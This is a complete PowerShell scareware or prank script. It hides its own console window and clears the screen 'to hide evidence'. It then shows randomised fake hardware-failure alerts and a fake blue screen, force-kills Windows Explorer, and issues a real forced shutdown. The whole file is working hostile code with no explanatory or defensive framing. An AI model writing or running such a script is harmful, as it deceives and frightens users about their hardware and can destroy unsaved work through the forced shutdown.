# Clear terminal history (hides evidence of execution)
Clear-Host

# Instantly hide the PowerShell window
$psWindow = (Get-Process -Id $PID).MainWindowHandle

# Check if the WinAPI type is already defined
if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    }
"@
}

# Hide PowerShell Immediately (No "1s" output)
[void][WinAPI]::ShowWindow($psWindow, 0)

# Fake delay to build suspense
Start-Sleep -Seconds 15

# Function to show realistic error messages
function Show-Error {
    param (
        [string]$message,
        [string]$title
    )
    [void][WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
}

# List of realistic errors (Motherboard & Memory failure)
$errors = @(
    "System Overload: Voltage Surge Detected on PCI Bus.",
    "BIOS Integrity Failure: Checksum Mismatch Detected!",
    "Critical RAM Malfunction: Data Leakage Detected.",
    "Kernel Security Check Failure: Unauthorized Memory Write!",
    "Corrupt Memory Stack: System Data May Be Permanently Lost!",
    "Motherboard Bus Failure: Southbridge Chip Unresponsive!",
    "Fatal Error: Liquid Intrusion Detected Near CPU Socket!",
    "Memory Controller Failure: Incorrect Read/Write Values!",
    "VRM Overheat Detected: System May Experience Irreversible Damage!",
    "CPU Registers Corrupt: Unexpected Instruction Set Detected!",
    "Data Storage Fault: Filesystem Integrity Compromised!",
    "Thermal Protection Override: Temperature Sensors Disabled!"
)

# Display errors at unpredictable intervals
for ($i = 0; $i -lt 6; $i++) {
    Show-Error ($errors | Get-Random) "SYSTEM CRITICAL ERROR"
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 12)  # Random wait time
}

# Fake BSOD Sequence (Reveal PowerShell again)
[void][WinAPI]::ShowWindow($psWindow, 5)

# Fake Blue Screen simulation
Start-Process "cmd.exe" -ArgumentList "/c color 1F && mode con cols=80 lines=25 && echo A critical system error has occurred... && timeout 10" -NoNewWindow -Wait

# Simulated hardware failure (flashing error messages)
for ($i=0; $i -lt 4; $i++) {
    Start-Process "cmd.exe" -ArgumentList "/c color 4F && echo Memory corruption spreading! && timeout 1" -NoNewWindow -Wait
    Start-Process "cmd.exe" -ArgumentList "/c color 1F && echo CRITICAL FAILURE! Kernel Error!" -NoNewWindow -Wait
}

# Final catastrophic error
Show-Error "OS integrity compromised! Immediate shutdown required to prevent hardware damage!" "FATAL SYSTEM ERROR"

# Make Windows Explorer disappear (blank screen)
Stop-Process -Name explorer -Force
Start-Sleep -Seconds 5

# Fake Forced Shutdown
Start-Process "shutdown.exe" -ArgumentList "/s /t 5 /c 'Critical system instability detected! Immediate power off required!'" -NoNewWindow -Wait
